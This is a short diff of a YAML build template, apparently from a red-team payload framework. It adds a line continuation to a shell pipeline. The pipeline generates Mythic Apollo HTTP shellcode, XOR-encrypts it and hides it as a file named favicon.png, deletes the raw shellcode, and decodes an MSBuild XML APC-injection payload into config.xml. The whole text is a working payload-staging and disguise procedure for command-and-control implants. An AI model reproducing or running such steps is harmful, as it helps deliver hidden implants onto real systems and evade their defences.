@@ -7,7 +7,7 @@ metadata:
 
 content: |
   mkdir -p packstation/outbound; \
-  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }}
+  {{ include('scripts/generate-mythic-apollo-http-shellcode.yaml') }} \
   python {{ templates_dir }}/helper_scripts/shellcode_encrypter.py -m xor -i packstation/outbound/shellcode.bin -o packstation/outbound/favicon.png ; \
   rm packstation/outbound/shellcode.bin ; \
   python -c "import base64; open('packstation/outbound/config.xml','w').write(base64.b64decode('{{ include('payloads/msbuild-xml-apc.yaml') | base64 }}').decode())" ; \
